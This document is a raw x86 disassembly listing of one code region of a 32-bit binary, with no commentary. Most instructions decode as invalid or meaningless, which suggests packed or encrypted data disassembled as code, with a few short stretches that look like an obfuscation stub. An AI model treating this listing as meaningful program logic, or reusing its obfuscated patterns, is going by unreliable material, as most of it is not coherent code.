  40191b:	mov    WORD PTR [edx+0x503235cb],gs
  401921:	inc    esp
  401922:	cmp    BYTE PTR [esi+0x50],al
  401925:	adc    DWORD PTR [ebx],edi
  401927:	loopne 0x401988
  401929:	ficom  DWORD PTR [eax+0x20]
  40192c:	mov    al,0xd4
  40192e:	psrlw  mm3,QWORD PTR [ebx-0x1a]
  401932:	imul   BYTE PTR [ebp-0x12ae8fae]
  401938:	mov    eax,ds:0xe3c2bc87
  40193d:	jne    0x401955
  40193f:	in     al,dx
  401940:	(bad)  
  401941:	jno    0x40193c
  401943:	jb     0x40194a
  401945:	fcmovne st,st(5)
  401947:	xor    DWORD PTR [ebp+0x72],0x42
  40194b:	xchg   DWORD PTR ds:0xa373d5cc,ebx
  401951:	pop    ecx
  401952:	pop    edi
  401953:	sub    ah,BYTE PTR [ebp-0x76]
  401956:	imul   ebp,DWORD PTR [edi-0x54],0x47
  40195a:	adc    eax,0x188557ae
  40195f:	imul   edx,DWORD PTR [edx],0x59
  401962:	enter  0xf8d0,0xd4
  401966:	mov    ecx,0xdac221a1
  40196b:	retf   0x254a
  40196e:	inc    esp
  40196f:	ret    0xab22
  401972:	imul   ebp,DWORD PTR [esi],0x736ca1f8
  401978:	pusha  
  401979:	test   eax,0x3085a6f8
  40197e:	(bad)
  401984:	jecxz  0x40199d
  401986:	clc    
  401987:	pop    es
  401988:	mov    edi,0xd32699dd
  40198d:	aam    0x3e
  40198f:	loop   0x401961
  401991:	in     al,0xeb
  401993:	je     0x4019ed
  401995:	(bad)  
  401996:	mov    esi,0x9245f416
  40199b:	out    0x3c,eax
  40199d:	sub    al,0x0
  40199f:	cs inc edi
  4019a1:	dec    ebx
  4019a2:	xor    bl,BYTE PTR [esi]
  4019a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019a5:	mov    ch,0x32
  4019a7:	xchg   ecx,eax
  4019a8:	push   edi
  4019a9:	outs   dx,BYTE PTR ds:[esi]
  4019aa:	repz jbe 0x4019ff
  4019ad:	push   ds
  4019ae:	mov    dh,0x33
  4019b0:	ret    0x7d3d
  4019b3:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  4019ba:	add    BYTE PTR [eax],al
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	pop    esp
  401a1a:	jp     0x4019aa
  401a1c:	call   0x70b095c5
  401a21:	xchg   edi,eax
  401a22:	jge    0x401a94
  401a24:	jo     0x4019e2
  401a26:	das    
  401a27:	ds cli 
  401a29:	add    BYTE PTR ds:0xf1f82849,dh
  401a2f:	lea    esp,[edi-0x6b71bd82]
  401a35:	(bad)  
  401a36:	aam    0xa8
  401a38:	sahf   
  401a39:	jb     0x4019e0
  401a3b:	mov    al,ds:0x7f9ec8f5
  401a40:	cs pop esi
  401a42:	(bad)  
  401a45:	mov    ds:0xd467389,al
  401a4a:	in     al,0x6b
  401a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a4d:	jmp    0xaa8901f7
  401a52:	mov    ds:0xf40b6674,al
  401a57:	cmp    eax,0xf145855a
  401a5c:	fnstsw WORD PTR [edx-0x16b2a450]
  401a62:	jecxz  0x401a6d
  401a64:	pop    ss
  401a65:	mov    ch,0xce
  401a67:	or     esp,DWORD PTR [ebx+0x4014a9c0]
  401a6d:	test   ebx,edx
  401a6f:	fistp  DWORD PTR [edi-0x76]
  401a72:	(bad)  
  401a73:	mov    edi,0x7c96839f
  401a78:	fmul   QWORD PTR [ecx+0x3c]
  401a7b:	shr    BYTE PTR [edx-0x377a1d84],1
  401a81:	in     eax,0x68
  401a83:	cmp    dh,BYTE PTR [eax]
  401a85:	sub    edi,DWORD PTR [ebp-0x68b34713]
  401a8b:	mov    WORD PTR [ebp-0x2e],es
  401a8e:	xor    al,0x58
  401a90:	loop   0x401a92
  401a92:	lahf   
  401a93:	aas    
  401a94:	jb     0x401a46
  401a96:	xor    al,0x1b
  401a98:	aas    
  401a99:	lea    edi,[ebx+0x5]
  401a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a9d:	lahf   
  401a9e:	push   ebp
  401a9f:	push   cs
  401aa0:	sbb    ebx,esp
  401aa2:	cmp    edi,DWORD PTR [esi+0x33]
  401aa5:	inc    esi
  401aa6:	into   
  401aa7:	xor    DWORD PTR [ecx-0x23],esi
  401aaa:	cmc    
  401aab:	mov    DWORD PTR [ebx],ecx
  401aad:	cmp    DWORD PTR [esi],edi
  401aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ab0:	ins    DWORD PTR es:[edi],dx
  401ab1:	pop    es
  401ab2:	and    DWORD PTR [esi+ebp*4+0x6e],ebp
  401ab6:	inc    ecx
  401ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ab8:	mov    dh,0x28
  401aba:	lahf   
  401abb:	and    eax,0xe7ea9e0b
  401ac0:	and    eax,0xc4f1493c
  401ac5:	test   eax,0x1e354f25
  401aca:	and    al,0x9d
  401acc:	js     0x401b3f
  401ace:	ror    DWORD PTR [eax-0x62cc4a4d],cl
  401ad4:	popa   
  401ad5:	fwait
  401ad6:	in     al,0x1
  401ad8:	mov    bl,0xc1
  401ada:	sbb    BYTE PTR [edi-0x29],ch
  401add:	bound  ebx,QWORD PTR [ecx+0x25e5c852]
  401ae3:	in     eax,0x94
  401ae5:	push   ss
  401ae6:	or     ah,bh
  401ae8:	sbb    esi,eax
  401aea:	(bad)  
  401aeb:	aas    
  401aec:	icebp  
  401aed:	pop    esi
  401aee:	repnz xchg ecx,eax
  401af0:	inc    edi
  401af1:	add    dl,BYTE PTR [ecx+eiz*4]
  401af4:	imul   esi,eax,0x2ae0338
  401afa:	sar    BYTE PTR [ecx-0x36],1
  401afd:	fadd   st,st(2)
  401aff:	rol    BYTE PTR [ebx+edx*1-0x29],cl
  401b03:	xchg   esi,eax
  401b04:	scas   al,BYTE PTR es:[edi]
  401b05:	and    DWORD PTR [eax],ebx
  401b07:	into   
  401b08:	ins    BYTE PTR es:[edi],dx
  401b09:	jb     0x401b28
  401b0b:	shr    DWORD PTR ds:0x376be299,0x72
  401b12:	gs add ebx,esp
  401b15:	shl    BYTE PTR [ecx-0x32059024],cl
  401b1b:	icebp  
  401b1c:	jg     0x401b01
  401b1e:	lds    ecx,FWORD PTR [ecx]
  401b20:	cmc    
  401b21:	fcmovnu st,st(6)
  401b23:	pop    bp
  401b25:	mov    edx,0x2cbc7068
  401b2a:	mov    ah,0x70
  401b2c:	mov    cl,BYTE PTR [ecx+0x934509d]
  401b32:	pop    ds
  401b33:	sahf   
  401b34:	arpl   WORD PTR [ebx],si
  401b36:	ins    BYTE PTR es:[edi],dx
  401b37:	pop    ss
  401b38:	call   0xde06:0x9f298a2e
  401b3f:	xchg   ebp,eax
  401b40:	mov    esp,0x3c5afe83
  401b45:	jb     0x401b70
  401b47:	adc    DWORD PTR [ecx],ecx
  401b49:	lock jle 0x401bb4
  401b4c:	dec    esi
  401b4d:	xor    BYTE PTR [edi],al
  401b4f:	jbe    0x401b50
  401b51:	xor    ebp,DWORD PTR [ebx+0x523bcff2]
  401b57:	jae    0x401b2b
  401b59:	push   edi
  401b5a:	lock cld 
  401b5c:	jmp    0x472ff5bc
  401b61:	xor    al,0xc1
  401b63:	lock int3 
  401b65:	cmp    eax,0x5c239ba
  401b6a:	inc    edx
  401b6b:	ins    DWORD PTR es:[edi],dx
  401b6c:	inc    edi
  401b6d:	sbb    eax,0x61a2d757
  401b72:	add    al,0x85
  401b74:	stc    
  401b75:	inc    DWORD PTR ds:0x33922cc0
  401b7b:	sub    ebp,edx
  401b7d:	fdivr  st,st(2)
  401b7f:	mov    eax,ds:0x5c50b492
  401b84:	bound  edi,QWORD PTR [ebx]
  401b86:	jge    0x401b62
  401b88:	out    0x44,al
  401b8a:	or     BYTE PTR [edx+0x396b1c25],cl
  401b90:	dec    esi
  401b91:	cwde   
  401b92:	xchg   ebp,eax
  401b93:	cdq    
  401b94:	mov    al,0x1a
  401b96:	daa    
  401b97:	aas    
  401b98:	xor    BYTE PTR ds:0xa5d15bfc,bh
  401b9e:	and    edi,DWORD PTR [edi+ecx*8-0xd8b788]
  401ba5:	xchg   BYTE PTR [ebp+0xf6fbe05],bh
  401bab:	cmp    eax,0x820a8d4d
  401bb0:	not    bh
  401bb2:	call   0x17cc:0xb811e458
  401bb9:	fcomp  DWORD PTR [ecx]
  401bbb:	jns    0x401bee
  401bbd:	mov    ds:0x64b825c1,eax
  401bc2:	push   esp
  401bc3:	out    dx,al
  401bc4:	sub    eax,0x5ac165c9
  401bc9:	mov    dh,0xbe
  401bcb:	shl    DWORD PTR [eax-0x788f81cb],0xe0
  401bd2:	test   DWORD PTR [esi+esi*1-0x40bdb34c],ebx
  401bd9:	jno    0x401c3a
  401bdb:	xchg   BYTE PTR [esi+0x5f],ah
  401bde:	pop    eax
  401bdf:	sbb    al,dh
  401be1:	mov    ah,0x6c
  401be3:	ins    BYTE PTR es:[edi],dx
  401be4:	sub    al,0xd7
  401be6:	jecxz  0x401c5e
  401be8:	jnp    0x401b73
  401bea:	or     DWORD PTR gs:[edi+edi*2-0x221b56c3],esp
  401bf2:	test   al,0x5f
  401bf4:	ret    0x1fdf
  401bf7:	scas   eax,DWORD PTR es:[edi]
  401bf8:	xor    di,WORD PTR [ebx+0x19b042ff]
  401bff:	push   edi
  401c00:	cld    
  401c01:	outs   dx,BYTE PTR ds:[esi]
  401c02:	add    eax,0x30b6161d
  401c07:	imul   edx,ecx,0x4b
  401c0a:	mov    BYTE PTR [esp+ecx*2],al
  401c0d:	test   al,0x9b
  401c0f:	pop    gs
  401c11:	repnz xor eax,0xb8b75df2
  401c17:	xchg   ecx,eax
  401c18:	push   esi
  401c19:	or     edi,DWORD PTR [esp+ebx*2-0x3e]
  401c1d:	mov    WORD PTR [edx-0x4b],ss
  401c20:	push   esi
  401c21:	repnz call 0x84e6:0xa500ee1f
  401c29:	sub    ebp,DWORD PTR [edx-0x72]
  401c2c:	push   esi
  401c2d:	mov    dl,0x16
  401c2f:	sbb    dl,BYTE PTR [ebx-0x57]
  401c32:	add    bh,BYTE PTR [ebx-0x7]
  401c35:	pushf  
  401c36:	xor    BYTE PTR [ebx+0xf],ch
  401c39:	sbb    eax,0xf6a43d72
  401c3e:	bound  eax,QWORD PTR [ecx+0x190a06a9]
  401c44:	daa    
  401c45:	xchg   edi,eax
  401c46:	push   eax
  401c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c48:	xchg   ecx,eax
  401c49:	inc    eax
  401c4a:	cmp    eax,0x7abbd0e7
  401c4f:	pop    ebp
  401c50:	and    ch,BYTE PTR cs:[ecx-0x21164df]
  401c57:	sub    al,0x19
  401c59:	inc    edi
  401c5a:	push   es
  401c5b:	sub    DWORD PTR [ecx+0x32b5b704],esi
  401c61:	aas    
  401c62:	push   ecx
  401c63:	jnp    0x401cb2
  401c65:	push   0xffffff9a
  401c67:	jecxz  0x401ce5
  401c69:	fisttp QWORD PTR [ecx+0x6ba2b535]
  401c6f:	pop    ecx
  401c70:	enter  0x1f56,0x7a
  401c74:	xor    al,0x15
  401c76:	mov    eax,ds:0x9c2f3a96
  401c7b:	add    BYTE PTR [edx],bl
  401c7d:	stos   BYTE PTR es:[edi],al
  401c7e:	jp     0x401c74
  401c80:	or     ch,bh
  401c82:	nop
  401c83:	xor    dl,BYTE PTR [edx-0x3ff22478]
  401c89:	sub    bl,ah
  401c8b:	sub    BYTE PTR [edi+0x38],0x76
  401c8f:	rcr    DWORD PTR [edi],0xcd
  401c92:	test   al,0xe6
  401c94:	jg     0x401c91
  401c96:	sbb    edx,DWORD PTR [eax]
  401c98:	mov    bh,0x89
  401c9a:	jnp    0x401d1b
  401c9c:	xchg   ebx,eax
  401c9d:	cmp    eax,0x3b85f577
  401ca2:	mov    ebx,DWORD PTR [ebx+0x3b]
  401ca5:	data16 (bad) 
  401ca7:	stc    
  401ca8:	xor    esp,ecx
  401caa:	push   esp
  401cab:	pop    ebx
  401cac:	and    BYTE PTR [ecx-0x3c],cl
  401caf:	imul   esi,DWORD PTR [ebx-0x28],0xffffffc5
  401cb3:	pop    eax
  401cb4:	call   0x8077:0x8dec051
  401cbb:	gs cmp eax,0x2d4cefe2
  401cc1:	jge    0x401cb5
  401cc3:	mov    ds:0x444a4bf1,al
  401cc8:	inc    edx
  401cc9:	fisttp WORD PTR [edx+0x45]
  401ccc:	push   0xdc0ee05e
  401cd1:	dec    eax
  401cd2:	retf   
  401cd3:	aam    0xf5
  401cd5:	sbb    ah,dl
  401cd7:	fnstcw WORD PTR [edi+esi*4-0x4230e510]
  401cde:	pop    eax
  401cdf:	int    0x5f
  401ce1:	aad    0x37
  401ce3:	test   eax,0xb8479178
  401ce8:	lods   al,BYTE PTR ds:[esi]
  401ce9:	jmp    0xc95d877f
  401cee:	mov    ebx,0xbf476996
  401cf3:	dec    esi
  401cf4:	pop    ds
  401cf5:	popa   
  401cf6:	(bad)  
  401cf7:	retf   
  401cf8:	cmp    esi,0x25
  401cfb:	les    esi,FWORD PTR [eax+ebp*2]
  401cfe:	xor    al,0xda
  401d00:	jbe    0x401cce
  401d02:	jmp    0x8782:0xc7030a3d
  401d09:	lods   al,BYTE PTR ds:[esi]
  401d0a:	xor    eax,0x9b4fd89c
  401d0f:	test   BYTE PTR [esi-0x59],dh
  401d12:	and    ebp,DWORD PTR [eax]
  401d14:	pop    ds
  401d15:	inc    edi
  401d16:	jb     0x401cf6
  401d18:	mov    al,ds:0xafd9216e
  401d1d:	adc    eax,DWORD PTR [ecx-0x7]
  401d20:	hlt    
  401d21:	pop    esp
  401d22:	fistp  DWORD PTR [ecx+0x749539d2]
  401d28:	jo     0x401caf
  401d2a:	(bad)  
  401d2c:	sbb    BYTE PTR [edi+0x5a],bh
  401d2f:	cmp    al,dl
  401d31:	sbb    BYTE PTR ds:0xb539e2fa,0x67
  401d38:	outs   dx,DWORD PTR ds:[esi]
  401d39:	mov    esp,0xffe4255
  401d3e:	sbb    dl,dh
  401d40:	out    dx,al
  401d41:	pop    edx
  401d42:	cmp    al,0x45
  401d44:	pushf  
  401d45:	and    dl,BYTE PTR [edx+0x4f5b01aa]
  401d4b:	jle    0x401d13
  401d4d:	arpl   WORD PTR [ecx-0x52],si
  401d50:	das    
  401d51:	xchg   DWORD PTR [ebp+0x33060a5a],ebp
  401d57:	(bad)  [esi-0x74]
  401d5a:	ror    dl,0x4
  401d5d:	in     al,0xfc
  401d5f:	nop
  401d60:	fmul   st,st(7)
  401d62:	je     0x401d38
  401d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d65:	je     0x401d1f
  401d67:	cmp    DWORD PTR ds:[ebp+0x6],ecx
  401d6b:	mov    BYTE PTR [eax],0x87
  401d6e:	pushf  
  401d6f:	ret    0x97f8
  401d72:	fsub   DWORD PTR [edi-0x47]
  401d75:	mov    edi,0x61aea1e1
  401d7a:	mov    BYTE PTR [ecx-0x17],dh
  401d7d:	pop    ss
  401d7e:	(bad)  
  401d7f:	out    dx,eax
  401d80:	shl    BYTE PTR [ebp+0x72],1
  401d83:	(bad)  
  401d84:	rcl    esp,1
  401d86:	out    0x14,al
  401d88:	cmp    dh,BYTE PTR [eax]
  401d8a:	sbb    DWORD PTR [edi-0x1ae86c56],edi
  401d90:	cmc    
  401d91:	jae    0x401d8f
  401d93:	or     BYTE PTR [edi],bh
  401d95:	jmp    0x2a2b:0x6682e359
  401d9c:	sbb    BYTE PTR [eax+0x48],cl
  401d9f:	inc    ecx
  401da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401da1:	arpl   WORD PTR [ebx-0x17],sp
  401da4:	xor    BYTE PTR [ecx+0x32],dl
  401da7:	dec    ecx
  401da8:	cmp    ch,BYTE PTR [edx-0x32d9d102]
  401dae:	xchg   esi,eax
  401daf:	retf   
  401db0:	retf   
  401db1:	push   ecx
  401db2:	push   edx
  401db3:	(bad)
  401db7:	clc    
  401db8:	add    DWORD PTR ds:[edi],edi
  401dbb:	adc    al,0x2b
  401dbd:	nop
  401dbe:	push   ecx
  401dbf:	push   ecx
  401dc0:	xor    DWORD PTR ds:0x434266,ebx
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432cde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432cce,0x43426e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	add    DWORD PTR [edx+0x73b2455],edx
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401d94
  401dfc:	mov    cl,0x92
  401dfe:	add    BYTE PTR [edx-0x44],dl
  401e01:	add    ah,BYTE PTR [ebx+0x33]
  401e04:	fsubr  st(6),st
  401e06:	mov    ah,0x62
  401e08:	adc    BYTE PTR [edi+0xf],ch
  401e0b:	and    eax,0xe0bb14fd
  401e10:	push   ebp
  401e11:	sbb    al,0x44
  401e13:	je     0x401dfe
  401e15:	clc    
  401e16:	inc    esi
  401e17:	mov    esp,0xbf12efb7
  401e1c:	push   esp
  401e1d:	sahf   
  401e1e:	lods   eax,DWORD PTR ds:[esi]
  401e1f:	jbe    0x401e40
  401e21:	xor    esi,ebp
  401e23:	mov    eax,0x36cbc121
  401e28:	push   edx
  401e29:	and    dl,BYTE PTR [edi]
  401e2b:	or     eax,0xb8a16e02
  401e30:	push   edi
  401e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e32:	mov    ss,WORD PTR [edx+0x5d14e98c]
  401e38:	ret    0x974c
  401e3b:	dec    esi
  401e3c:	sahf   
  401e3d:	dec    edi
  401e3e:	(bad)
  401e42:	es pop eax
  401e44:	push   ebp
  401e45:	jnp    0x401df0
  401e47:	xlat   BYTE PTR ds:[ebx]
  401e48:	and    dl,BYTE PTR [ebx+eiz*8]
  401e4b:	mov    edx,0x22c51c55
  401e50:	pop    edi
  401e51:	mov    esp,DWORD PTR [edi-0x9]
  401e54:	ret    
  401e55:	xchg   BYTE PTR [ecx-0xe],dl
  401e58:	lahf   
  401e59:	push   es
  401e5a:	gs jbe 0x401e42
  401e5d:	jmp    0x23e170ba
  401e62:	mov    eax,0x5dfb87e2
  401e67:	rol    eax,1
  401e69:	ja     0x401e03
  401e6b:	push   es
  401e6c:	rcl    esi,cl
  401e6e:	pop    ds
  401e6f:	sub    ecx,DWORD PTR [edx]
  401e71:	dec    ebx
  401e72:	in     eax,0xde
  401e74:	inc    esp
  401e75:	mov    ebp,0x52336137
  401e7a:	pop    ebp
  401e7b:	push   edi
  401e7c:	ins    BYTE PTR es:[edi],dx
  401e7d:	dec    edx
  401e7e:	cmp    edi,DWORD PTR [edx-0x19a71279]
  401e84:	or     BYTE PTR [ecx+0x4b],0xe3
  401e88:	fild   WORD PTR [ecx]
  401e8a:	mov    dl,BYTE PTR [ebp+0x66a79392]
  401e90:	cmp    cl,BYTE PTR [edi-0x64]
  401e93:	cld    
  401e94:	stc    
  401e95:	jg     0x401e85
  401e97:	scas   al,BYTE PTR es:[edi]
  401e98:	lds    esi,FWORD PTR [ecx+0x4858f5d5]
  401e9e:	dec    edx
  401e9f:	push   0xffffffea
  401ea1:	stos   DWORD PTR es:[edi],eax
  401ea2:	adc    dh,dl
  401ea4:	out    0x13,al
  401ea6:	mov    bl,0x1
  401ea8:	(bad)  
  401ea9:	call   0xf8f1a6be
  401eae:	imul   esp,DWORD PTR [edx+0x72e71cee],0x40
  401eb5:	fild   DWORD PTR [edx]
  401eb7:	stos   BYTE PTR es:[edi],al
  401eb8:	adc    al,0x7f
  401eba:	fdivr  QWORD PTR [edi]
  401ebc:	mov    esp,0xc36027a
  401ec1:	and    ch,bl
  401ec3:	into   
  401ec4:	jne    0x401f12
  401ec6:	pop    ds
  401ec7:	jno    0x401e56
  401ec9:	xchg   DWORD PTR [eax+0x79],esi
  401ecc:	pop    eax
  401ecd:	sbb    ah,ah
  401ecf:	inc    edi
  401ed0:	sbb    DWORD PTR ds:0xa2e1554b,ebp
  401ed6:	lock pop esp
  401ed8:	fs aaa 
  401eda:	jg     0x401ec8
  401edc:	sbb    ch,ah
  401ede:	arpl   sp,bp
  401ee0:	adc    ebp,DWORD PTR [edi-0x2f4a0b85]
  401ee6:	lds    ecx,FWORD PTR [esi-0x3e]
  401ee9:	fst    QWORD PTR [esi+0x4ac2d804]
  401eef:	fadd   QWORD PTR [ebx]
  401ef1:	pushf  
  401ef2:	jns    0x401eb1
  401ef4:	cmp    eax,DWORD PTR [ebp+0x62b25fd5]
  401efa:	js     0x401eac
  401efc:	enter  0x4542,0xf6
  401f00:	mov    DWORD PTR ds:0x4d1aa79a,ebx
  401f06:	dec    ebp
  401f07:	and    DWORD PTR [ebp+0x1a37472],0x29
  401f0e:	scas   eax,DWORD PTR es:[edi]
  401f0f:	xchg   ebp,eax
  401f10:	sar    eax,1
  401f12:	cmp    al,0xd8
  401f14:	push   edi
  401f15:	sbb    bh,BYTE PTR [ecx-0x28]
  401f18:	inc    edx
  401f19:	push   0x509027ef
  401f1e:	imul   edi,DWORD PTR [ecx],0x45
  401f21:	jp     0x401f5d
  401f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f24:	mov    ds:0xe7a6aa92,al
  401f29:	cmp    BYTE PTR [edi+0x5d92da0f],bh
  401f2f:	xchg   edi,eax
  401f30:	arpl   WORD PTR [esi-0x3b],sp
  401f33:	mov    DWORD PTR [ecx-0x5e2d82b1],esp
  401f39:	cld    
  401f3a:	push   es
  401f3b:	and    bh,ch
  401f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f3e:	fidiv  WORD PTR [ebp+0x415fcecf]
  401f44:	pushf  
  401f45:	mov    esi,0x358ade1b
  401f4a:	in     al,0xbc
  401f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f4d:	mov    dh,0xcc
  401f4f:	loop   0x401f93
  401f51:	fmul   QWORD PTR [esi+0x7b]
  401f54:	mov    cl,0x29
  401f56:	adc    BYTE PTR [edi+0x57],bl
  401f59:	(bad)  
  401f5a:	shl    BYTE PTR [ebx+esi*2],1
  401f5d:	daa    
  401f5e:	add    dl,dh
  401f60:	inc    ebx
  401f61:	retf   0xdce5
  401f64:	aaa    
  401f65:	xchg   ebp,eax
  401f66:	inc    edi
  401f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f68:	pop    ebp
  401f69:	lods   eax,DWORD PTR ds:[esi]
  401f6a:	xchg   esp,eax
  401f6b:	xchg   esp,eax
  401f6c:	repz sub eax,0x9598d891
  401f72:	jg     0x401f1f
  401f74:	xchg   BYTE PTR [ebp+0x5abadfe2],ch
  401f7a:	fiadd  WORD PTR [ecx-0x2f]
  401f7d:	jl     0x401f6b
  401f7f:	ret    0xdfdc
  401f82:	fadd   QWORD PTR [ebx]
  401f84:	jnp    0x401f96
  401f86:	push   ss
  401f87:	icebp  
  401f88:	not    DWORD PTR [ebp+0x2aeb4b70]
  401f8e:	adc    ah,dh
  401f90:	xor    bh,BYTE PTR [edx+0x6]
  401f93:	dec    edx
  401f94:	jge    0x401f7e
  401f96:	jge    0x401f27
  401f98:	push   edx
  401f99:	adc    al,dh
  401f9b:	mov    ebp,0xd5883087
  401fa0:	pop    ebp
  401fa1:	xor    DWORD PTR [edi+0x37],eax
  401fa4:	xor    cl,bl
  401fa6:	dec    edx
  401fa7:	cld    
  401fa8:	xchg   ebp,eax
  401fa9:	xor    BYTE PTR [edi+0x729d4182],dl
  401faf:	in     eax,0x1
  401fb1:	xchg   ecx,ecx
  401fb3:	frstor [ebx-0x55faa43b]
  401fb9:	outs   dx,DWORD PTR ds:[esi]
  401fba:	cdq    
  401fbb:	and    eax,0x17a339d0
  401fc0:	push   cs
  401fc1:	rcr    DWORD PTR [edi+0x62],cl
  401fc4:	push   0xebee6ccb
  401fc9:	jns    0x401ff3
  401fcb:	dec    ecx
  401fcc:	jmp    0x40202b
  401fce:	ins    DWORD PTR es:[edi],dx
  401fcf:	add    BYTE PTR [ecx],ah
  401fd1:	and    ebx,DWORD PTR [eax]
  401fd3:	les    esp,FWORD PTR [eax-0x67]
  401fd6:	jno    0x402021
  401fd8:	pusha  
  401fd9:	ud2    
  401fdb:	mov    al,ds:0x346605ec
  401fe0:	pop    eax
  401fe1:	jae    0x401f92
  401fe3:	jmp    0xfa0b:0xfab18d84
  401fea:	jecxz  0x401f76
  401fec:	out    0x94,al
  401fee:	push   esp
  401fef:	mov    eax,ds:0x36de948b
  401ff4:	xchg   esp,eax
  401ff5:	lock push esp
  401ff7:	sbb    edi,ecx
  401ff9:	push   0x1a80c1f8
  401ffe:	or     ah,al
  402000:	add    ebp,esp
  402002:	(bad)  
  402003:	in     eax,0x77
  402005:	loop   0x402029
  402007:	jno    0x401fc7
  402009:	dec    edi
  40200a:	pop    edi
  40200b:	cs sbb al,0x6d
  40200e:	jge    0x402017
  402010:	dec    esp
  402011:	jle    0x401fa3
  402013:	div    DWORD PTR [eax+0xdc0df89]
  402019:	jecxz  0x401fd5
  40201b:	mov    ch,0x4b
  40201d:	adc    eax,0x43425fb3
  402022:	pop    ebp
  402023:	mov    ds:0xbb137b62,al
  402028:	cmp    cl,BYTE PTR [ebx-0x28]
  40202b:	push   ebx
  40202c:	inc    ecx
  40202d:	mov    dl,0x5e
  40202f:	sub    DWORD PTR [edi-0x28720f01],ecx
  402035:	aam    0x24
  402037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402038:	sub    DWORD PTR [edi-0x72],edx
  40203b:	loope  0x402067
  40203d:	das    
  40203e:	push   esp
  40203f:	sbb    al,0x9c
  402041:	test   al,0xf
  402043:	cld    
  402044:	jmp    0x40bf:0x2425f42
  40204b:	mov    ds:0x9f1fcd7d,eax
  402050:	call   0x3db6d00b
  402055:	shl    DWORD PTR es:[eax-0x76c3c691],1
  40205c:	jbe    0x402001
  40205e:	mov    ebp,0x92081f42
  402063:	cld    
  402064:	(bad)  
  402065:	jmp    0xa36e27ca
  40206a:	pop    eax
  40206b:	adc    DWORD PTR [edx],esi
  40206d:	adc    BYTE PTR ds:0x6985377d,cl
  402073:	mov    al,ds:0xa5413646
  402078:	outs   dx,DWORD PTR ds:[esi]
  402079:	cli    
  40207a:	mov    ebp,0x29ccae59
  40207f:	cli    
  402080:	lock dec BYTE PTR [eax+0x6a09e45]
  402087:	xor    eax,0xa288c1be
  40208c:	frstpm(287 only) 
  40208e:	arpl   cx,bx
  402090:	imul   esp,DWORD PTR [ecx+0x2cc91cce],0xc13ebd85
  40209a:	sub    ebp,DWORD PTR [edx+0x811835d]
  4020a0:	mov    ecx,0xdc80d06d
  4020a5:	or     DWORD PTR [ecx-0x2e76c999],0xffffffd5
  4020ac:	and    al,0xe1
  4020ae:	scas   al,BYTE PTR es:[edi]
  4020af:	push   ebx
  4020b0:	cmp    dl,BYTE PTR ds:0x182599d
  4020b6:	shl    BYTE PTR [edx],cl
  4020b8:	scas   al,BYTE PTR es:[edi]
  4020b9:	push   esp
  4020ba:	popa   
  4020bb:	outs   dx,BYTE PTR ds:[esi]
  4020bc:	jmp    0x4020ff
  4020be:	xchg   esi,eax
  4020bf:	cmp    BYTE PTR [ebp+0x4c433054],cl
  4020c5:	pusha  
  4020c6:	xchg   esi,eax
  4020c7:	scas   al,BYTE PTR es:[edi]
  4020c8:	repz inc esi
  4020ca:	push   esi
  4020cb:	sbb    al,0x88
  4020cd:	jg     0x402146
  4020cf:	xor    ch,bl
  4020d1:	sub    DWORD PTR [edx+0x73],0xffffffc5
  4020d5:	stos   DWORD PTR es:[edi],eax
  4020d6:	push   cs
  4020d7:	jns    0x402065
  4020d9:	lea    ecx,[eax]
  4020db:	push   0x7b
  4020dd:	sbb    al,0x9e
  4020df:	dec    BYTE PTR [ebp-0x60eef0bc]
  4020e5:	inc    ecx
  4020e6:	sbb    al,BYTE PTR [ebp-0x35fc18db]
  4020ec:	push   ebx
  4020ed:	mov    ebx,DWORD PTR [esi]
  4020ef:	mov    ebp,0x81fa3133
  4020f4:	mov    esp,0x959f240b
  4020f9:	rcr    DWORD PTR [edx+0x416a793e],1
  4020ff:	sbb    BYTE PTR gs:[ebx],dl
  402102:	push   es
  402103:	mov    ds:0x82ff0d18,al
  402108:	or     eax,0x6d915a38
